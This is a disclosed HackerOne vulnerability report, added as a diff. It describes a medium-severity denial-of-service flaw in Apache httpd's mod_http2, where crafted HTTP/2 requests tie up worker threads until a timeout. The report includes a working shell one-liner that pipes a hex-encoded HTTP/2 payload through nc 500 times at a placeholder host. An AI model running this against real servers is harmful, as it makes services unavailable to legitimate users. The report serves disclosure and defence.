@@ -1,0 +1,19 @@
+ReportLink:https://hackerone.com/reports/384839
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/cy1337
+ReportedTo:Apache httpd (IBB)(ibb-apache)
+BountyAmount:500.0
+Severity:medium
+State:Closed
+DateOfDisclosure:28.10.2018 15:54:21
+
+Summary:
+
+mod_http2 can be tricked by specially crafted requests to hold server resources longer than necessary.
+
+A simple demonstration of this for a server with h2c enabled is as follows:
+for x in `seq 0 500`; do echo 505249202a20485454502f322e300d0a0d0a534d0d0a0d0a00001204000000000000000000006400044000000000020000000000001b0104000000018284864187089d5c0b8178ff7a8825b650c3abb6f2e053032a2f2a00001b0105000000019a84864187089d5c0b8178ff7a880000000000000000 | xxd -r -p | nc hostname port 2>&1 >/dev/null & done
+
+## Impact
+
+Certain crafted HTTP2 requests identified with afl-fuzz can cause Apache worker threads to stay open waiting for data until a timeout. A typical configuration has a 1 minute timeout with 150 request workers. This means an attacker can effectively make the service unresponsive to legitimate users with a slow rate (3-4 requests/second) of short crafted requests.
